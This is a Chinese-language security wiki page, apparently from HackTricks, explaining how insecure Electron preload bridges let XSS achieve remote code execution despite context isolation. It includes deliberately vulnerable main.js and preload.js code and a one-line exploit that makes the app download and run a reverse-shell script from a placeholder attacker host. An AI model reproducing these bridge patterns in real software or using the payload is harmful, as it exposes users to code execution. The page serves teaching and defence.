# Electron contextIsolation 通过 IPC 实现 RCE

{{#include ../../banners/hacktricks-training.md}}

Context isolation 并不能让不安全的 preload bridge 变得安全。如果 preload 向 renderer 内容暴露了特权 IPC，那么 XSS 或被入侵的 renderer 就可以调用该 bridge；是否能实现 RCE，取决于相应主进程处理程序的验证方式和能力范围。Electron 建议每种操作只暴露一个范围明确的方法、验证 IPC 发送方，并且绝不暴露原始 IPC 基元。<sup>[[3]](#references)[[4]](#references)</sup>

**这些示例大多取自这里** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo)。观看视频了解更多信息。<sup>[[1]](#references)</sup>

## 示例 0

示例来自 [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21)（这些幻灯片中有 MS Teams 如何从 XSS 演变为 RCE 的完整示例；这里仅是一个非常基础的示例）：<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 示例 1

检查 `main.js` 如何监听 `getUpdate`，并**下载和执行传入的任意 URL**。\
另请检查 `preload.js` 如何**暴露来自 main 的任意 IPC 事件**。

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## 示例 2

如果 preload 暴露了 `shell.openExternal`，却未验证 scheme 和目标地址，renderer 可控的输入就可能启动已注册的外部处理程序。是否会因此导致代码执行，取决于平台、已安装的处理程序、scheme 和 Electron 版本；应将其限制为明确列入 allowlist 的预期 `https:` 目标。<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## 示例 3

如果 preload 暴露了与主进程不受限制的通信方式，XSS 就能发送任意 channel 名称和数据。其影响取决于已注册的 IPC handlers 及其授权检查。

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [使用 XSS 和 RCE 攻击现代桌面应用的 Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [我如何攻破 Microsoft Teams，并在 Pwn2Own 中获得 150,000 美元](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — 安全检查清单](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — 上下文隔离与安全 API 暴露](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
